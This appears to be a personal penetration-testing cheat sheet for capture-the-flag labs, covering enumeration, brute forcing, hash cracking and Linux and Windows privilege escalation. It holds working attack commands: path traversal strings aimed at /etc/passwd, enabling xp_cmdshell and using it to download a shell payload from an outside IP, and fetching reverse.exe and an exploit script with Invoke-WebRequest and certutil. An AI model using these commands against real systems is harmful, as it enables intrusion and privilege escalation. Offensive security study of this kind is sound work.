Things to think about when stuck:
    
    Don't know what to do next:
        "Is there anything I can just bruteforce?"
        "Can I reuse some credentials for ssh or maybe just some other login?"
        "Does this service have default credentials?"
        "Have you looked for any databases? Maybe credentials to a database found in a configuration file?"
        "What else is open for me to input?"
        "Is there a place where I can try to see for a local file inclusion exploit?"
            - When you can't see the files, you can put
                "../etc/passwd"
                "../../etc/passwd"
                "../../../passwd"...

                Until you find the hashed passwords.
        "Have you tried to switch users?"
        "Have you seen if "groups" returns anything interesting?"
        "Have you checked GTFOBins for privesc? It contains many privesc scripts for vulnerable binaries."
        "Can you try to write something to tmp? Is it even world writable?"

    Exploit Found but still stuck:
        "If I found an exploit, or maybe even if I haven't, is there a place the service stores a database? Can I access that place?"
        "If I need a specific file type (.asp, .html, etc) have a tried to make a payload with that file extension with msfvenom?"
        "Can I base64 encode a powershell script with the -enc command and call it on the target computer?"
        "Have I tried encoding the payload?"

    No exploit, only information:
        "Is the version exploitable? Are there known exploits to this technology?"

    Access, but no root:
        "Is there a process that writes/executes as root? Can I somehow make it write/execute a reverse root shell?"

Photo Forensics:
    exiftools - to look at photo exif data (meta data)
    binwalk - to extract any embedded files or executables from a photo
    steghide - to hide or decode messages inside images or audio files 

---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

Binary File:

Enumeration:
    
    Swiss Army:
        Metasploit(msfconsole) - Database with interactive shell to run known exploits on targets. 
            * ALWAYS SET LHOST TO BE THM VPN IP!!!!!!!
            * ALWAYS SET THE LHOST, PAYLOAD, AND LPORT WHEN USING METERPRETER SHELL FOR WINDOWS MACHINES
            * On windows, "C:\Windows\Temp" is typically a folder that is world writable.
            * You can use the suggester for suggestions on priviledge escalation by backgrounding the session then calling "search suggestor" and using it.
                ^Make sure you record the session that is backgrounded.

    ---------------------------------------

    Brute Forcing:
        gobuster - For bruteforcing directories and files on a webserver
        dirbuster - For bruteforcing directories and files on a webserver
        hydra - For bruteforcing usernames and passwords on ssh, http, https, etc.
        hashcat - For cracking hashed passwords. Remember that hashcat has hashmodes for different hashes, so try "hashcat -h | grep <relevant name>" to try to find a hash mode.
            * ie. sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt --force // To use MD5 hash-based crack with rockyou wordlist
            * ie. echo <some_password> | hashcat -r /opt/hashcat/rules/best64.rule --stdout
             
        john(john the ripper) - Password cracking from all sorts of formats such a zip, sha256, md5, etc.
        sqlmap - Spams all sorts of different sql attacks to (including blind) to try and get the database.
            * Can be used to gain a shell with --os-shell if it is PostGRES. 

        If you have a password that isn't working, but the password has a date/season/year in it, maybe try the current year?

    ---------------------------------------

    Networking:
        nc (NetCat) - Port listener that will give you control of a port through a terminal among other things 
        nmap - Enumeration essential for scanning ports
        ssh - Secure Shell Protocol with RSA encryption which can be overcome with someone's rsa private key.
                * Sometimes even failing to login-in to SSH can reveal a banner that has some information about how to log in or
                just some sort of additional information.
        Docker
            - Docker toolbox is used by creating a small virtual box on a host system then hosting docker. 
                * If you want to connect to docker via ssh, it is possible through the host computer by doing:
                    "ssh docker@<IP OF HOST>"
    
    ---------------------------------------

    Hashing and Cracking:

Exploitation

    Payloads:

        Reverse Shells:
            - Sometimes switching from a staged to a non-staged or vice versa can fix a problem of the shell "dying".

    Brute Force:
    
        - Password Spraying / Credential stuffing with BurpSuite.

Linux Servers:


Priviledge Escalation:

    Things to think about:
        - OS version vulnerability / sysinfo.
        - SUID files
        - Writeable /etc/passwd to make a new superuser
        - Root execution of vi
        - Any useful groups that you are a part of?
        - Cronjobs with root user
        - Uploading files to tmp/dev/shm (shared memory folder ?typically world-writable?)
        - Looking at operating system with uname -a or cat /etc/lsb-release
        - Try using bash <script> instead of ./<script>
        - Accessing a database of some sort (remember that most databases can be accessed through the command line! ie. mysql)
    
    ---------------------------------------

    *nix:
        /bin/sh - opens a shell (can be useful for SUID programs accessible by a user that is also accessible.

        " find / -perm -u=s -type f 2>/dev/null " - to find all files in the system that have root setting on execution.

        " export PATH=/tmp:$PATH " - For setting a temporary executable in tmp for path variable abuse.
        

---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

Unix Native:

    The .ssh directory - If there is an id_rsa key in the file, you can mv the id_rsa.pub into the directory "authenticated_keys" which can also just be created. This will allow ssh if you then use the id_rsa file as the private key logging in.

    strings - Can be used to find special keywords and printable characters in a binary file EVEN while being executed to see what the executable binary is actually doing.

    "sed -i -e 's/\r$//' scriptname.sh" - Windows will have these stupid fucking line endings in their text files, so you can do a "Stream Editor" call to fix the file -i inplace with an -e expression.

    tee - for piping input and output easily

    ifconfig - for seeing network information and ipaddress

    whoami - See the currnet user's username

    curl (client URL) - Allow arbitrary sending of http requests
        ** THIS CAN TRIGGER A REVERSE SHELL IF YOU POINT IT AT AN UPLOADED REVERSE SHELL FILE ON A WEBSITE!!!!!!! **

    cat - Show the contents of a file

    THIS -> | - Using the pipe to force the next command to be executed can be useful when a windows server will only execute powershell scripts after a pipe.

    less - Show the contents of a file

    echo "$SHELL" - Show which shell the user is currently using

    "sudo -l" - For listing what can be run as sudo even when as a non-sudoer

    "sudo -u" - For running scripts as another user, preferably with root priviledges.
        * On the chance that you do have that ability, running "sudo -u rootuser /bin/bash" will give you a root shell.

    ps -p $$ - Show which shell the user is currently using reliably

    /etc/passwd - Catting/lessing this file will show all the 
    users in the server at the bottom of the list.
    
    /etc/shells - Catting/lessing this file will show all the
    shells available.

    initctl - Controls the initializer (that typically runs as root) in /etc/init. All the files in this
    folder can be run by initctl. ie. initctl <configuration here>

    ls -la /etc/passwd - List priviledges from passwd.

    find - Allows you to search the filesystem starting at some directory with specified attributes

        * find / -perm -u=s -type f 2>/dev/null - Find SUID files in a linux filesystem for privesc. Read man for details : "You must specify `u', `g' or `o' if you use a symbolic mode."

        * find /(or home/<USER>) -type f -readable -ls 2>/dev/null - Find any files that are world readable.

        * find / -type f -group somegroup - Find all files that belong to a certain group (can be run by those group members)

    lsb_release -a (linux standard base) - Shows short title information about linux distro
    and linux version.

    netstat -ano - This will list all the active ports on a machine.

    arp -a - To look at the ARP table of a machine.

---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

Databases:
    mysql - Command line tool for accesing local machine databases
        * ie. mysql -h <TARGET HOST> -u <USERNAME> -p -D <DATABASE NAME>

---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

Tmux commands:
    
    Copy - Press the tmux toggler then space to select the words you want to copy. Then press ENTER to copy it into clip board and paste with vim with set paste.

---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

Nmap commands:
    // To see any mounts on a smb server accesible through rpcbind
    nmap -p <rpcbind port> --script=nfs-ls,nfs-statfs,nfs-showmount <ip of where smb is located>

---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

Windows Powershell (WTF)
    
    MSSQL Command Bullshit (MSSQL is super-fucky and does not work with the commands below in PrivEsc watch out and use these!)
        First do this to configure the fuckery that is mssql:

			*EXEC sp_configure 'Show Advanced Options', 1;
			*reconfigure;
			*sp_configure;
			*EXEC sp_configure 'xp_cmdshell', 1
			*reconfigure;
			*xp_cmdshell "whoami"

        - xp_cmdshell "powershell wget -UseBasicParsing http://10.10.14.9:9001/powershell.ps1 -OutFile %temp%/shell.exe"
        

    PrivEsc:

        * If you are denied access to a folder, but have the path to a folder that comes through that restricted folder, trying to access the direct path might fucking work for some reason!*

        psexec.py (meterpreter version too), smbexec, wmiexec - Linux login into Windows server as long as you have user and password.

        powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe - To do a Windows equivalent of a wget with powershell.
            - Make sure you are in a world-writable directory such as C://Windows/Temp/
        
        certutil - Although it is used for fetching certificates, it can be used for fetching any arbitrary file, including executables. 

        sherlock.ps1 - AutoEnumeration of known exploits
            - ie. certutil -urlcache -f http://10.10.10.x/sherlock.ps1 sherlock.ps1
            Then on the target machine: "powershell.exe -exec bypass -Command "& {Import-Module .\sher.ps1; Find-AllVulns}" "
    
    Meterpreter Commands:
        - getuid => same as whoami in windows.
        - ps => to get to running processes and identify certain users including yourself.
        - migrate -> to migrate to a more stable user in higher position.
            * Certain metasploit exploits WILL NOT WORK WITHOUT A STABLE PROCESS/USER.

    Meterpreter PrivEsc:
        - Remeber that sometimes getting another reverse shell with metasploit once you have a session can give you a shell with higher priviledges as NT AUTHORITY/SYSTEM instead of whatever you had earlier.
        - Try looking for a service that has an authority to migrate to. Then background the process and then try to use 
        the windows exploit suggestor by searching "suggester" in metasploit.
